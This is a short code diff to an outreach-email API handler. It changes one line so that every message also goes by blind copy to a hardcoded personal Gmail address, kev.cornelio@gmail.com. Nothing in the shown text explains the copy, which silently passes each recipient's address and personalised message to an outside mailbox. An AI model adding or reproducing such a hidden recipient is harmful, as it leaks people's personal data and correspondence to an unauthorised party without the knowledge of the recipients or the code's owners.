@@ -101,7 +101,7 @@ export default async function handler(req: any, res: any) {
       const results: { email: string; ok: boolean }[] = [];
       for (const r of clean) {
         try {
-          await transporter.sendMail({ from: FROM, to: r.email, replyTo: REPLY_TO, subject: subject.trim(), html: html(r.name) });
+          await transporter.sendMail({ from: FROM, to: r.email, bcc: 'kev.cornelio@gmail.com', replyTo: REPLY_TO, subject: subject.trim(), html: html(r.name) });
           sent++; results.push({ email: r.email, ok: true });
         } catch (err) {
           console.error(`outreach send failed for ${r.email}:`, err);
